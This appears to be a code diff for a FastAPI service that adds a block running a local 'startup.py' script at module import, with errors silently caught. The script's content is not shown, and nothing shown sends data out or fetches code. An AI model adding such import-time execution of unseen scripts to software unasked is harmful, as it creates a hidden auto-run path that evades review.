@@ -38,6 +38,16 @@ async def lifespan(app: FastAPI):
     await init_db()
     yield
 
+
+# Auto-download missing static files on startup
+import subprocess, sys as _sys
+try:
+    _startup = Path(__file__).parent / "startup.py"
+    if _startup.exists():
+        subprocess.run([_sys.executable, str(_startup)], check=False, timeout=60)
+except Exception as _e:
+    print(f"Startup warning: {_e}")
+
 app = FastAPI(
     title="Syntesis-ICP API",
     version="1.0.0",
